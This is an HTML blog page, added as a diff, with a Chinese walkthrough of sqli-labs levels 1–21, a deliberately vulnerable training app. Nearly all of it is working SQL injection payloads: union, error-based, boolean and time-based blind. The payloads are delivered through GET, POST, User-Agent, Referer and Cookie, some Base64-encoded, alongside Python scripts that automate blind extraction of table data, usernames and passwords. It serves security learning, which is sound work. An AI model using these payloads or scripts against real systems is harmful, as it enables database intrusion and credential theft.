@@ -1,0 +1,737 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>sqli-labs 1-22 | Gridea</title>
+<link rel="shortcut icon" href="https://https://jinqipiaopiao.github.io//favicon.ico?v=1624177818252">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://https://jinqipiaopiao.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="sqli-labs 1-22 | Gridea - Atom Feed" href="https://https://jinqipiaopiao.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="第一关：GET字符型注入
+正常输入：
+id=1
+
+
+字符型注入
+id=1' and 1='1
+# 有数据
+
+id=1' and 1='2
+# 无数据
+
+{当输入 and 1='1时，后台执行 Sql 语句：
+
+select * from &..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://https://jinqipiaopiao.github.io/">
+  <img class="avatar" src="https://https://jinqipiaopiao.github.io//images/avatar.png?v=1624177818252" alt="">
+  </a>
+  <h1 class="site-title">
+    Gridea
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              sqli-labs 1-22
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-04-06
+              </span>
+              <span>
+                22 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="第一关get字符型注入">第一关：GET字符型注入</h1>
+<p>正常输入：</p>
+<pre><code>id=1
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1617714029485.png" alt="" loading="lazy"><br>
+<strong>字符型注入</strong></p>
+<pre><code>id=1' and 1='1
+# 有数据
+
+id=1' and 1='2
+# 无数据
+
+{当输入 and 1='1时，后台执行 Sql 语句：
+
+select * from &lt;表名&gt; where id = 'x' and 1='1'
+
+语法正确，逻辑判断正确，所以返回正确。
+
+当输入 and 1='2时，后台执行 Sql 语句：
+
+select * from where id = 'x' and 1='2'
+
+语法正确，但逻辑判断错误，所以返回错误。}
+</code></pre>
+<p>报错，说明是字符型注入<br>
+我们输入的--+变成了--空格，此时--后面的语句被注释掉了，不会再执行<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1617714464023.png" alt="" loading="lazy"><br>
+<strong>字段数</strong></p>
+<pre><code>id=0' order by 1,2,3,4,5,6,7,8,9,10 --+
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1617714506592.png" alt="" loading="lazy"><br>
+<strong>数据库</strong></p>
+<pre><code>id=0' union SELECT 1,2,database() --+
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1617714564705.png" alt="" loading="lazy"><br>
+<strong>获取所有的数据库</strong></p>
+<pre><code>id=0' union SELECT 1,2,group_concat(schema_name) from information_schema.schemata --+
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1617714616680.png" alt="" loading="lazy"><br>
+<strong>表</strong></p>
+<pre><code>id=0' union SELECT 1,2,group_concat(table_name) from information_schema.tables WHERE table_schema=database() --+
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1617714655550.png" alt="" loading="lazy"><br>
+<strong>列名</strong></p>
+<pre><code>id=0' union SELECT 1,2,group_concat(column_name) from information_schema.columns WHERE table_name='users' --+
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1617714683808.png" alt="" loading="lazy"><br>
+<strong>查询数据</strong></p>
+<pre><code>id=0' union SELECT 1,2,group_concat(username) from users --+
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://https://jinqipiaopiao.github.io//post-images/1617714703345.png" alt="" loading="lazy"></figure>
+<h1 id="第二关get数字型注入">第二关:GET数字型注入</h1>
+<p><strong>注入类型</strong></p>
+<pre><code>id=1 and 1=1
+# 有数据
+id=1 and 1=2 
+# 无数据
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1617718601256.png" alt="" loading="lazy"><br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1617718612885.png" alt="" loading="lazy"><br>
+<strong>查列数</strong></p>
+<pre><code>id=1 order by 1,2,3,4,5
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1617718661352.png" alt="" loading="lazy"><br>
+<strong>查数据库</strong></p>
+<pre><code>id=0 union select 1,2,database() --+
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1617718711069.png" alt="" loading="lazy"><br>
+或<br>
+id=0 union select 1,2,group_concat(schema_name) from information_schema.schemata<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1617718849753.png" alt="" loading="lazy"><br>
+<strong>查表</strong></p>
+<pre><code>id=0 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1617719573631.png" alt="" loading="lazy"><br>
+<strong>查字段</strong></p>
+<pre><code>id=0 union select 1,2,group_concat(column_name) from information_schema.columns where table_name = 'users'
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1617719819637.png" alt="" loading="lazy"><br>
+<strong>查数据</strong></p>
+<pre><code>id=0 union select 1,2,group_concat(username) from users
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://https://jinqipiaopiao.github.io//post-images/1617720041981.png" alt="" loading="lazy"></figure>
+<h1 id="第三关get单引号构造闭合">第三关：GET单引号构造闭合</h1>
+<p>闭合为('')<br>
+<strong>判断注入类型</strong></p>
+<pre><code>id=1) and 1=1 --+
+id=1) and 1=2 --+
+# 以上两个payload都可以返回数据，说明不是数字型注入
+id=1') and 1=1 --+
+# 能返回数据
+id=1') and 1=2 --+
+# 不能返回数据
+# 说明是字符型包含闭合的注入
+</code></pre>
+<p><strong>查字段数</strong></p>
+<pre><code>id=1') order by 1,2,3,4 --+
+</code></pre>
+<p><strong>查数据库</strong></p>
+<pre><code>id=0') union select 1,2, group_concat(schema_name) from information_schema.schemata --+
+或
+id=0') union select 1,2, database() --+
+</code></pre>
+<p><strong>查表名</strong></p>
+<pre><code>id=0') union select 1,2,group_concat(table_name) from information_schema.tables WHERE table_schema=database() --+
+</code></pre>
+<p><strong>查列名</strong></p>
+<pre><code>id=0') union select 1,2,group_concat(column_name) from information_schema.columns WHERE table_name='users' --+
+</code></pre>
+<p><strong>查数据</strong></p>
+<pre><code>id=0') union select 1,2,group_concat(username) from users --+
+</code></pre>
+<h1 id="第四关get双引号闭合sql语句">第四关：GET双引号闭合sql语句</h1>
+<p>闭合方式(&quot;&quot;)<br>
+<strong>判断类型</strong><br>
+双引号闭合</p>
+<pre><code>id=1&quot;) and 1=2 --+
+</code></pre>
+<p><strong>查字段数</strong></p>
+<pre><code>3个字段数
+id=1&quot;) order by 1,2,3,4 --+
+</code></pre>
+<p><strong>查数据库</strong></p>
+<pre><code>id=0&quot;) union select 1,2, group_concat(schema_name) from information_schema.schemata --+
+</code></pre>
+<p><strong>查询数据表</strong></p>
+<pre><code>id=0&quot;) union select 1,2, group_concat(table_name) from information_schema.tables WHERE table_schema=database() --+
+</code></pre>
+<p><strong>查询列名</strong></p>
+<pre><code>id=0&quot;) union select 1,2, group_concat(column_name) from information_schema.columns WHERE table_name='users' --+
+</code></pre>
+<p><strong>查询数据</strong></p>
+<pre><code>id=0&quot;) union select 1,2, group_concat(username) from users--+
+</code></pre>
+<h1 id="第五关-get单引号盲注和报错注入">第五关 ：GET单引号盲注和报错注入</h1>
+<p><strong>注入类型</strong></p>
+<pre><code>id=1' and 1=1 --+
+# 有数据
+
+id=1' and 1=2 --+
+# 无数据
+</code></pre>
+<p>单引号字符型盲注<br>
+<strong>脚本自动化</strong><br>
+通过每一位的比较真假，得出每一位的字符。</p>
+<pre><code>id=1' and 1=if(ascii(substr(database(),1,1))&gt;32,1,0)--+
+</code></pre>
+<p>手动太麻烦，直接上Python脚本：</p>
+<pre><code>import requests
+url = &quot;url/Less-5/?id=1' and 1= &quot;
+result = ''
+i = 0
+
+while True:
+i = i + 1
+head = 32
+tail = 127
+
+while head &lt; tail:
+mid = (head + tail) &gt;&gt; 1
+# payload = f'if(ascii(substr(database(),{i},1))&gt;{mid},1,0)--+'
+# payload = f'if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))&gt;{mid},1,0)--+'
+# payload = f'if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),{i},1))&gt;{mid},1,0)--+'
+# payload = f'if(ascii(substr((select group_concat(username) from users),{i},1))&gt;{mid},1,0)--+'
+payload = f'if(ascii(substr((select group_concat(password) from users),{i},1))&gt;{mid},1,0)--+'
+r = requests.get(url + payload)
+if &quot;You are in&quot; in r.text:
+head = mid + 1
+else:
+tail = mid
+
+if head != 32:
+result += chr(head)
+else:
+break
+print(result)
+</code></pre>
+<p><strong>updatexml报错注入</strong></p>
+<pre><code>id=1' and updatexml(1, concat(0x7e, (select database()), 0x73), 1)--+
+</code></pre>
+<p><strong>重复报错</strong></p>
+<pre><code>id=' union select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a --+
+</code></pre>
+<h1 id="第六关get双引号时间盲注与报错注入">第六关：GET双引号时间盲注与报错注入</h1>
+<p><strong>注入类型</strong></p>
+<pre><code>id=1&quot; and 1=1 --+
+id=1&quot; and 1=2 --+
+</code></pre>
+<p>双引号字符型盲注<br>
+<strong>自动化脚本</strong></p>
+<pre><code>import requests
+url = &quot;url/Less-6/?id=1\&quot; and 1= &quot;
+
+result = ''
+i = 0
+
+while True:
+i = i + 1
+head = 32
+tail = 127
+
+while head &lt; tail:
+mid = (head + tail) &gt;&gt; 1
+payload = f'if(ascii(substr(database(),{i},1))&gt;{mid},1,sleep(3))--+'
+# payload = f'if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))&gt;{mid},1,sleep(3))--+'
+# payload = f'if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),{i},1))&gt;{mid},1,sleep(3))--+'
+# payload = f'if(ascii(substr((select group_concat(username) from users),{i},1))&gt;{mid},1,sleep(3))--+'
+# payload = f'if(ascii(substr((select group_concat(password) from users),{i},1))&gt;{mid},1,sleep(3))--+'
+try:
+r = requests.get(url + payload, timeout=2)
+head = mid + 1
+except Exception as e:
+tail = mid
+
+if head != 32:
+result += chr(head)
+else:
+break
+print(result)
+</code></pre>
+<p><strong>updatexml注入</strong></p>
+<pre><code>id=1&quot; and updatexml(1, concat(0x7e, (select database()), 0x73), 1)--+
+</code></pre>
+<p><strong>重复报错注入</strong></p>
+<pre><code>id=&quot; union select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a --+
+</code></pre>
+<h1 id="第八关get单引号盲注无报错">第八关：GET单引号盲注+无报错</h1>
+<p>跟第五关的盲注一样，mysql_error()注释掉了，不能报错注入。<br>
+没有任何提示，因为它把错误信息隐藏了，所以并不能用显错式注入，只能用盲注。<br>
+盲注需要掌握一些MySQL的相关函数：<br>
+length(str)：返回str字符串的长度。<br>
+substr(str, pos, len)：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始<br>
+mid(str,pos,len):跟上面的一样，截取字符串<br>
+ascii(str)：返回字符串str的最左面字符的ASCII代码值。<br>
+ord(str):同上，返回ascii码<br>
+if(a,b,c) :a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0</p>
+<pre><code>首先要记得常见的ASCII，A:65,Z:90 a:97,z:122, 0:48, 9:57
+</code></pre>
+<p>首先select database()查询数据库<br>
+ascii(substr((select database()),1,1))：返回数据库名称的第一个字母,转化为ascii码<br>
+ascii(substr((select database()),1,1))&gt;64：ascii大于64就返回true，if就返回1，否则返回0</p>
+<p>首先要记得常见的ASCII，A:65,Z:90 a:97,z:122, 0:48, 9:57</p>
+<p>首先select database()查询数据库<br>
+ascii(substr((select database()),1,1))：返回数据库名称的第一个字母,转化为ascii码<br>
+ascii(substr((select database()),1,1))&gt;64：ascii大于64就返回true，if就返回1，否则返回0</p>
+<pre><code>?id=1' and if(ascii(substr((select database()),1,1))&gt;64, 1, 0) %23
+</code></pre>
+<p>或者这样就简单一点<br>
+?id=1' and ascii(substr((select database()),1,1))&gt;64 %23<br>
+为什么这里是布尔型盲注呢，因为这里没把数据输出，只是$row有数据和无数据的时候显示的结果不一样</p>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1617880292215.webp" alt="" loading="lazy"><br>
+猜测数据库名字第一个字母：<br>
+?id=1' and ascii(substr((select database()),1,1))&gt;114 --+<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1617880317917.webp" alt="" loading="lazy"></p>
+<p>大于114时返回正确<br>
+?id=1' and ascii(substr((select database()),1,1))&gt;115 --+<br>
+这时错误，说明ascii应该为115，即s,再接着推测第二个，然后可判断应该为security数据库，然后依次推出其他数据，比较麻烦。<br>
+?id=1' and left(database(),1)='s' --+<br>
+返回正确，可确定第一个字母为s.<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1617880344515.webp" alt="" loading="lazy"></p>
+<p>猜数据库名第一个字母具体过程，使用二分法</p>
+<pre><code>1.?id=1' and ascii(substr((select database()),1,1)&gt;64 %23 返回正确，大于64
+1.?id=1' and ascii(substr((select database()),1,1))&gt;96 %23 返回正确，大于96
+2.?id=1' and ascii(substr((select database()),1,1))&lt;123 %23 返回正确，小于123 ，区间在97-122
+3.?id=1' and ascii(substr((select database()),1,1))&gt;109 %23 返回正确，大于109，区间在110-122
+4.?id=1' and ascii(substr((select database()),1,1))&gt;116 %23 返回错误，所以在110-116之间
+5.?id=1' and ascii(substr((select database()),1,1))&gt;112 %23 返回正确，大于112，区间在113-116之间
+6.?id=1' and ascii(substr((select database()),1,1))&gt;114 %23 返回正确，大于114，间在115-116之间
+7.?id=1' and ascii(substr((select database()),1,1))&gt;115 %23 返回错误，不大于115，即第一个字母的ascii为115，即字母s
+</code></pre>
+<p>盲注过程是漫长的，一般是自己写脚本或使用工具辅助</p>
+<h1 id="第九关get-盲注-基于时间-单引号">第九关：GET - 盲注 - 基于时间 - 单引号</h1>
+<p>方法一：参考目录文章MySQL盲注：基于时间延迟注入（Sleep函数）</p>
+<p>方法二：<br>
+?id=1'  其余与Less-10相同。<br>
+基础知识:<br>
+​ 1.sleep(x): 执行后，睡眠x秒后执行。</p>
+<pre><code>​ 2.if(a,b,c): 如果a正确，b执行否则c执行。
+
+注入:
+​ 1.基于'  的时间盲注。
+
+​ 2.?id=1 ,?id=1' 发现不论对错不会回显且不会产生变化，采用时间盲注。
+
+​ 3.?id=1 and sleep(5) –+ ,?id=1' and sleep(5) --+ 判断闭合。
+
+​ 4.?id=1' and if(length(database())=7,1,sleep(5)) --+ ，判断数据库名长度。
+
+​ 5.?id=1' and if(substr(database(),1,1)='s' ,sleep(5),1) --+ ,判断数据库名。或 ?id=1' and if(ascii(substr(database(),1,1))=115,sleep(5),1) --+ ，判断数据库名。通过改变substr的步长来逐步猜测。
+
+​ 6.?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=114,sleep(5),1) --+ ,判断表名。改变limit，substr步数逐步判断。
+
+​ 7.同理得到列名，账号密码。
+</code></pre>
+<h1 id="第十关-get-盲注-基于时间-双引号">第十关： GET - 盲注 - 基于时间 - 双引号</h1>
+<p>​ 1.基于 “ 的时间盲注。</p>
+<p>​ 2.?id=1” 其余与Less-9相同。</p>
+<pre><code>http://127.0.0.1/sqli-labs/Less-10/?id=1&quot; and if(length(database())=7,1,sleep(5)) --+
+
+http://127.0.0.1/sqli-labs/Less-10/?id=1&quot; and if(ascii(substr(database(),1,1))=115,sleep(5),1) --+     判断数据库名。通过改变substr的步长来逐步猜测。
+或者
+http://127.0.0.1/sqli-labs/Less-10/?id=1&quot; and if(substr(database(),1,1)='s',sleep(5),1) --+,判断数据库
+
+http://127.0.0.1/sqli-labs/Less-10/?id=1&quot; and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)) =114,sleep(5),1) --+
+或者
+http://127.0.0.1/sqli-labs/Less-10/?id=1&quot; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) =114,sleep(5),1) --+
+</code></pre>
+<h1 id="第十一关post单引号注入">第十一关：POST单引号注入</h1>
+<p><strong>判断类型</strong><br>
+单引号字符型注入</p>
+<pre><code>uname=1' or 1=1#&amp;passwd=admin 
+注意：注释不能用–+会出错，要采用#代替。
+# 有数据
+
+uname=1' or 1=2#&amp;passwd=admin
+# 无数据
+</code></pre>
+<p><strong>注入：</strong><br>
+1.基于 '  的post注入。<br>
+​2.查看源码发现账户名为: uname,密码名为: passwd,提交为: submit=Submit。<br>
+​3.采用post注入，</p>
+<pre><code>uname=admin&amp;passwd=admin&amp;submit=Submit ,回显成功.
+</code></pre>
+<p>​4.判断注入类型</p>
+<pre><code>uname=admin' #&amp;passwd=admin&amp;submit=Submit ,回显成功.
+</code></pre>
+<p>5.查询字段数</p>
+<pre><code>uname=admin' order by 1,2,3,4 #&amp;passwd=admin&amp;submit=Submit,得到字段为2.
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1617928975656.png" alt="" loading="lazy"><br>
+6.判断回显</p>
+<pre><code>uname=admin' union select 1,2 #&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>7.查找数据库名</p>
+<pre><code>uname=1' union select 1,database() #&amp;passwd=admin&amp;submit=Submit      只能查询当前所用的数据库
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1617928930822.png" alt="" loading="lazy"><br>
+或者</p>
+<pre><code>uname=1' union select 1,group_concat(schema_name) from  information_schema.schemata#&amp;passwd=admin      能查询全部的数据库
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1617928865230.png" alt="" loading="lazy"><br>
+8.查询表名</p>
+<pre><code>uname=1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='security' #&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>或者</p>
+<pre><code>uname=1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>9.查找列名</p>
+<pre><code>uname=1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #&amp;passwd=admin&amp;submit=Submit 
+</code></pre>
+<p>10.查询数据</p>
+<pre><code>uname=1' union select 1,group_concat(username) from users#&amp;passwd=admin
+</code></pre>
+<p><strong>第十二关：POST双引号括号闭合</strong><br>
+1.注入类型</p>
+<pre><code>uname=1&quot;) or 1=1#&amp;passwd=admin&amp;submit=Submit 显示数据
+uname=1&quot;) or 1=2#&amp;passwd=admin&amp;submit=Submit 不显示数据
+说明为双引号括号闭合型
+</code></pre>
+<ol start="2">
+<li>uname=1&quot;) order by 1,2,3,4 #&amp;passwd=admin<br>
+uname=1&quot;) union select 1,group_concat(schema_name) from information_schema.schemata#&amp;passwd=admin<br>
+uname=1&quot;) union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#&amp;passwd=admin<br>
+uname=1&quot;) union select 1,group_concat(column_name) from information_schema.columns where table_name='users'#&amp;passwd=admin<br>
+uname=1&quot;) union select 1,group_concat(username) from users#&amp;passwd=admin<br>
+————————————————<br>
+版权声明：本文为CSDN博主「小龙在山东」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
+原文链接：https://blog.csdn.net/lilongsy/article/details/108627889</li>
+</ol>
+<h1 id="第十三关post单引号盲注和报错注入">第十三关：POST单引号盲注和报错注入</h1>
+<p>1.判断注入类型</p>
+<pre><code>uname=1') or 1=1 #&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1617931079113.png" alt="" loading="lazy"><br>
+uname=1') or 1=2 #&amp;passwd=admin&amp;submit=Submit<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1617931112882.png" alt="" loading="lazy"><br>
+可以得出单引号闭合型<br>
+2.获取相关数据</p>
+<pre><code>uname=1') and updatexml(1,concat(0x7e,(select database()),0x7e),1)#&amp;passwd=admin ：获取数据库
+uname=1') and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)#&amp;passwd=admin : 获取表名
+uname=1') and updatexml(1,concat(0x7e,(select group_concat(column_name)from infromation_schema.columns where table_name='users'),0x7e),1)#&amp;passwd=admin : 获取列名
+uname=1') and updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1) #&amp;passwd=admin : 获取数据
+</code></pre>
+<h1 id="第十四关双引号盲注报错注入">第十四关：双引号盲注+报错注入</h1>
+<p>判断注入类型:</p>
+<pre><code>uname=1&quot; or 1=1#&amp;passwd=admin&amp;submit=Submit
+uname=1&quot; or 1=2#&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>数据库<br>
+uname=1&quot; and updatexml(1,concat(0x7e,(select group_concat(schema_name)from information_schema.schemata),0x7e),1)#&amp;passwd=admin</p>
+<p>表名<br>
+uname=1&quot; and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)#&amp;passwd=admin</p>
+<p>字段名<br>
+uname=1&quot; and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name='users'),0x7e),1)#&amp;passwd=admin</p>
+<p>表数据<br>
+uname=1&quot; and updatexml(1,concat(0x7e,(select group_concat(username)from users),0x7e),1)#&amp;passwd=admin</p>
+<h1 id="第十五关post单引号布尔盲注">第十五关：POST单引号布尔盲注</h1>
+<p>判断注入类型:</p>
+<pre><code>uname=1' or 1=1#&amp;passwd=admin&amp;submit=Submit
+uname=1' or 1=2#&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>数据库</p>
+<pre><code>uname=1' or substr(database(),1,1)='s'#&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>表名</p>
+<pre><code>uname=1' or if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=114,1,sleep(3))#&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>表数据</p>
+<pre><code>uname=1' or ascii(substr((select username from users limit 0,1),1,1))=68#&amp;passwd=admin&amp;submit=Submit  ：判断第一个字符是不是D
+</code></pre>
+<p>字段名</p>
+<pre><code>uname=1' or substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,4)='user' #&amp;passwd=admin&amp;submit=Submit
+
+{Welcome    Dhakkan
+Your Login name:2
+Your Password:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password} 
+</code></pre>
+<h1 id="第十六关post双引号闭合布尔盲注">第十六关：POST双引号闭合布尔盲注</h1>
+<p>判断是啥类型</p>
+<pre><code>uname=1&quot;) or 1=1#&amp;passwd=admin&amp;submit=Submit
+uname=1&quot;) or 1=2#&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>数据库</p>
+<pre><code>uname=1&quot;) or substr(database(),1,1)='s'#&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>表名</p>
+<pre><code>uname=1&quot;) or substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='r'#&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>字段</p>
+<pre><code>uname=1&quot;) or substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)='u'#&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>表数据</p>
+<pre><code>uname=1&quot;) or substr((select username from users limit 0,1),1,1)='D'#&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<h1 id="第十七关已知一字段过滤单引号报错注入另一字段">第十七关:已知一字段过滤，单引号报错注入另一字段</h1>
+<p>数据库</p>
+<pre><code>uname=admin&amp;passwd=' and updatexml(1,concat(0x7e,database(),0x7e),1)#
+</code></pre>
+<p>表名</p>
+<pre><code>uname=admin&amp;passwd=' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#    
+</code></pre>
+<p>字段</p>
+<pre><code>uname=admin&amp;passwd=' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e),1)#
+</code></pre>
+<p>表数据</p>
+<pre><code>uname=admin&amp;passwd=' and updatexml(1,concat(0x7e,(select * from (select concat_ws(0x7e,id,username,password) from users limit 0,1) b)),0) #
+</code></pre>
+<h1 id="第十八关ua注入单引号报错注入">第十八关：UA注入+单引号报错注入</h1>
+<p>uname和passwd都经过stripslashes和mysql_real_escape_string过滤，暂时无法绕过，所以先暴力破解出用户名和密码admin admin。题目也提示ip和ua可以注入。<br>
+Post data: uname=admin&amp;passwd=admin&amp;submit=Submit<br>
+数据库名</p>
+<pre><code>User-Agent: ',1,updatexml(1,concat(0x7e,database(),0x7e),1))#
+</code></pre>
+<p>表名</p>
+<pre><code>User-Agent: ',1,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1))#
+</code></pre>
+<p>列名</p>
+<pre><code>User-Agent: ',1,updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e),1))#
+</code></pre>
+<p>表数据</p>
+<pre><code>User-Agent: ',1,updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1))#
+</code></pre>
+<h1 id="less-19基于的referer报头文报错注入">less-19——基于’的Referer:报头文报错注入</h1>
+<p>把十八关的ua改为了Referer，其他一样：</p>
+<pre><code>Post data: uname=admin&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>数据库名</p>
+<pre><code>Referer: ',1,updatexml(1,concat(0x7e,database(),0x7e),1))#
+</code></pre>
+<p>表名</p>
+<pre><code>Referer: ',1,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1))#
+</code></pre>
+<p>列名</p>
+<pre><code>Referer: ',1,updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e),1))#
+</code></pre>
+<p>表数据</p>
+<pre><code>Referer: ',1,updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1))#   多条数据
+Referer: ',1,updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)
+</code></pre>
+<h1 id="第二十关cookie注入单引号">第二十关：Cookie注入+单引号</h1>
+<p>基于 ‘ 的 Cookie 注入。</p>
+<pre><code>Post data:uname=admin&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>数据库</p>
+<pre><code>uname=0' union select 1,2,database()#  单个数据库
+uname=0' union select 1,2,group_concat(schema_name) from information_schema.schemata #
+</code></pre>
+<p>表名</p>
+<pre><code>uname=0' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() #
+</code></pre>
+<p>列名</p>
+<pre><code>uname=0' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' #
+</code></pre>
+<p>表数据</p>
+<pre><code>uname=0' union select 1,2,group_concat(username) from users #
+</code></pre>
+<h1 id="第二十一关cookie-base64编码注入单引号括号闭合">第二十一关：Cookie base64编码注入+单引号括号闭合</h1>
+<p>比第二十关加了一层base64编码和括号闭合。<br>
+数据库名</p>
+<pre><code>uname=0') union select 1,2,group_concat(schema_name) from information_schema.schemata #
+Base64:uname=MCcpIHVuaW9uIHNlbGVjdCAxLDIsZ3JvdXBfY29uY2F0KHNjaGVtYV9uYW1lKSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS5zY2hlbWF0YSAj
+</code></pre>
+<p>表名</p>
+<pre><code>uname=0') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#
+Base64:uname=dW5hbWU9MCcpIHVuaW9uIHNlbGVjdCAxLDIsZ3JvdXBfY29uY2F0KHRhYmxlX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyB3aGVyZSB0YWJsZV9zY2hlbWE9ZGF0YWJhc2UoKSM=
+</code></pre>
+<p>列名</p>
+<pre><code>uname=0') union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'#
+Base64:uname=MCcpIHVuaW9uIHNlbGVjdCAxLDIsZ3JvdXBfY29uY2F0KGNvbHVtbl9uYW1lKSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS5jb2x1bW5zIHdoZXJlIHRhYmxlX25hbWU9J3VzZXJzJyM=
+</code></pre>
+<p>表数据</p>
+<pre><code>uname=0') union select 1,2,group_concat(username) from users#    
+Base64:uname=dW5hbWU9MCcpIHVuaW9uIHNlbGVjdCAxLDIsZ3JvdXBfY29uY2F0KHVzZXJuYW1lKSBmcm9tIHVzZXJzIw==
